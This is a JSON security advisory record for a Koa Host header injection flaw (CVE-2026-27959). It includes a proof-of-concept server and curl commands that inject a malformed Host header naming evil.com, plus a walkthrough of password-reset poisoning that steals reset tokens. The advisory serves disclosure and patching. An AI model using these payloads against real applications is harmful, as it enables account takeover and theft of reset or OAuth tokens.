{
  "Severity": "HIGH",
  "UpdatedAt": "2026-02-26T22:42:58Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "koa"
  },
  "Advisory": {
    "DatabaseId": 339444,
    "Id": "GSA_kwCzR0hTQS03Z2NjLXI4bTUtNDRxbc4ABS30",
    "GhsaId": "GHSA-7gcc-r8m5-44qm",
    "References": [
      {
        "Url": "https://github.com/koajs/koa/security/advisories/GHSA-7gcc-r8m5-44qm"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27959"
      },
      {
        "Url": "https://github.com/koajs/koa/commit/55ab9bab044ead4e82c70a30a4f9dc0fc9c1b6df"
      },
      {
        "Url": "https://github.com/koajs/koa/commit/b76ddc01fdb703e51652b0fd131d16394cadcfeb"
      },
      {
        "Url": "https://github.com/advisories/GHSA-7gcc-r8m5-44qm"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-7gcc-r8m5-44qm"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2026-27959"
      }
    ],
    "Description": "## Summary\n\nKoa's `ctx.hostname` API performs naive parsing of the HTTP Host header, extracting everything before the first colon without validating the input conforms to RFC 3986 hostname syntax. When a malformed Host header containing a `@` symbol (e.g., `evil.com:fake@legitimate.com`) is received, `ctx.hostname` returns `evil.com` - an attacker-controlled value. Applications using `ctx.hostname` for URL generation, password reset links, email verification URLs, or routing decisions are vulnerable to Host header injection attacks.\n\n## Details\n\nThe vulnerability exists in Koa's hostname getter in `lib/request.js`:\n\n```javascript\n// Koa 2.16.1 - lib/request.js\nget hostname() {\n  const host = this.host;\n  if (!host) return '';\n  if ('[' === host[0]) return this.URL.hostname || ''; // IPv6 literal\n  return host.split(':', 1)[0];\n}\n```\n\nThe `host` getter retrieves the raw header value with HTTP/2 and proxy support:\n\n```javascript\n// Koa 2.16.1 - lib/request.js\nget host() {\n  const proxy = this.app.proxy;\n  let host = proxy \u0026\u0026 this.get('X-Forwarded-Host');\n  if (!host) {\n    if (this.req.httpVersionMajor \u003e= 2) host = this.get(':authority');\n    if (!host) host = this.get('Host');\n  }\n  if (!host) return '';\n  return host.split(',')[0].trim();\n}\n```\n\n### The Problem\n\nThe parsing logic simply splits on the first `:` and returns the first segment. There is no validation that the resulting string is a valid hostname per RFC 3986 Section 3.2.2.\n\n**RFC 3986 Section 3.2.2** defines the host component as:\n\n```\nhost = IP-literal / IPv4address / reg-name\nreg-name = *( unreserved / pct-encoded / sub-delims )\nunreserved = ALPHA / DIGIT / \"-\" / \".\" / \"_\" / \"~\"\nsub-delims = \"!\" / \"$\" / \"\u0026\" / \"'\" / \"(\" / \")\" / \"*\" / \"+\" / \",\" / \";\" / \"=\"\n```\n\nThe `@` character is explicitly NOT permitted in the host component - it is the delimiter separating userinfo from host in the authority component.\n\n### Attack Vector\n\nWhen an attacker sends:\n\n```\nHost: evil.com:fake@legitimate.com:3000\n```\n\nKoa parses this as:\n\n| API | Returns | Notes |\n|-----|---------|-------|\n| `ctx.get('Host')` | `\"evil.com:fake@legitimate.com:3000\"` | Raw header |\n| `ctx.hostname` | `\"evil.com\"` | **Attacker-controlled** |\n| `ctx.host` | `\"evil.com:fake@legitimate.com:3000\"` | Raw header value |\n| `ctx.origin` | `\"http://evil.com:fake@legitimate.com:3000\"` | Protocol + malformed host |\n\nThe `ctx.hostname` API returns `evil.com` because the parser splits on the first `:` without understanding that `evil.com:fake@legitimate.com` is a malformed authority component where `evil.com:fake` would be interpreted as userinfo by a proper URI parser.\n\n### Additional Concern: `ctx.origin`\n\nKoa's `ctx.origin` property concatenates protocol and host without validation:\n\n```javascript\n// lib/request.js\nget origin() {\n  return `${this.protocol}://${this.host}`;\n}\n```\n\nApplications using `ctx.origin` for URL generation receive the full malformed Host header value, creating URLs with embedded credentials that browsers may interpret as userinfo.\n\n### HTTP/2 Consideration\n\nKoa explicitly checks `httpVersionMajor \u003e= 2` to read the `:authority` pseudo-header:\n\n```javascript\nif (this.req.httpVersionMajor \u003e= 2) host = this.get(':authority');\n```\n\nThe same vulnerability applies - malformed `:authority` values containing userinfo would be accepted and parsed identically.\n\n## PoC\n\n### Setup\n\n```javascript\n// server.js\nconst Koa = require('koa'); \nconst app = new Koa();\n\n// Simulates password reset URL generation (common vulnerable pattern)\napp.use(async ctx =\u003e {\n  if (ctx.path === '/forgot-password') {\n    const resetToken = 'abc123securtoken';\n    const resetUrl = `${ctx.protocol}://${ctx.hostname}/reset?token=${resetToken}`;\n    \n    ctx.body = {\n      message: 'Password reset link generated',\n      resetUrl: resetUrl,\n      debug: {\n        rawHost: ctx.get('Host'),\n        parsedHostname: ctx.hostname,\n        origin: ctx.origin,\n        protocol: ctx.protocol\n      }\n    };\n  }\n});\n\napp.listen(3000, () =\u003e console.log('Server on http://localhost:3000'));\n```\n\n### Exploit\n\n```bash\ncurl -H \"Host: evil.com:fake@localhost:3000\" http://localhost:3000/forgot-password\n```\n\n### Result\n\n```json\n{\n  \"message\": \"Password reset link generated\",\n  \"resetUrl\": \"http://evil.com/reset?token=abc123securtoken\",\n  \"debug\": {\n    \"rawHost\": \"evil.com:fake@localhost:3000\",\n    \"parsedHostname\": \"evil.com\",\n    \"origin\": \"http://evil.com:fake@localhost:3000\",\n    \"protocol\": \"http\"\n  }\n}\n```\n\nThe password reset URL points to `evil.com` instead of the legitimate server. In a real attack:\n\n1. Attacker requests password reset for victim's email with malicious Host header\n2. Server generates reset link using `ctx.hostname` â†’ `https://evil.com/reset?token=SECRET`\n3. Victim receives email with poisoned link\n4. Victim clicks link, token is sent to attacker's server\n5. Attacker uses token to reset victim's password\n\n### Additional Test Cases\n\n```bash\n# Basic injection\ncurl -H \"Host: evil.com:x@legitimate.com\" http://localhost:3000/forgot-password\n# Result: hostname = \"evil.com\"\n\n# With port preservation attempt\ncurl -H \"Host: evil.com:443@legitimate.com:3000\" http://localhost:3000/forgot-password  \n# Result: hostname = \"evil.com\"\n\n# Unicode/encoded variations\ncurl -H \"Host: evil.com:x%40legitimate.com\" http://localhost:3000/forgot-password\n# Result: hostname = \"evil.com\"\n```\n\n### Deployment Consideration\n\nFor this attack to succeed in production, the malicious Host header must reach the Koa application. This occurs when:\n\n1. **No reverse proxy** - Application directly exposed to internet\n2. **Misconfigured proxy** - Proxy doesn't override/validate Host header\n3. **Proxy trust enabled** (`app.proxy = true`) - `X-Forwarded-Host` can be injected\n4. **Default virtual host** - Server is the catch-all for unrecognized Host headers\n\n## Impact\n\n### Vulnerability Type\n\n- CWE-20: Improper Input Validation\n- CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax\n\n### Attack Scenarios\n\n**1. Password Reset Poisoning (High Severity)**\n- Attacker hijacks password reset tokens by poisoning reset URLs\n- Requires victim to click link in email\n- Results in account takeover\n\n**2. Email Verification Bypass**\n- Attacker poisons email verification links\n- Can verify attacker-controlled email on victim accounts\n\n**3. OAuth/SSO Callback Manipulation**\n- Applications using `ctx.hostname` for OAuth redirect URIs\n- Attacker redirects OAuth callbacks to malicious server\n- Results in token theft\n\n**4. Web Cache Poisoning**\n- If responses are cached without Host in cache key\n- Poisoned URLs served to all users\n- Persistent XSS/phishing via cached responses\n\n**5. Server-Side Request Forgery (SSRF)**\n- Internal routing decisions based on `ctx.hostname`\n- Attacker manipulates which backend receives requests\n\n### Who Is Impacted\n\n- **Direct impact**: Any Koa application using `ctx.hostname` or `ctx.origin` for URL generation without additional validation\n- **Common patterns**: Password reset, email verification, webhook URL generation, multi-tenant routing, OAuth implementations",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2026-02-26T22:42:57Z",
    "Severity": "HIGH",
    "Summary": "Koa has Host Header Injection via ctx.hostname",
    "UpdatedAt": "2026-02-26T22:42:58Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.5,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "2.16.4"
      },
      "VulnerableVersionRange": "\u003c 2.16.4"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "3.1.2"
      },
      "VulnerableVersionRange": "\u003e= 3.0.0, \u003c 3.1.2"
    }
  ]
}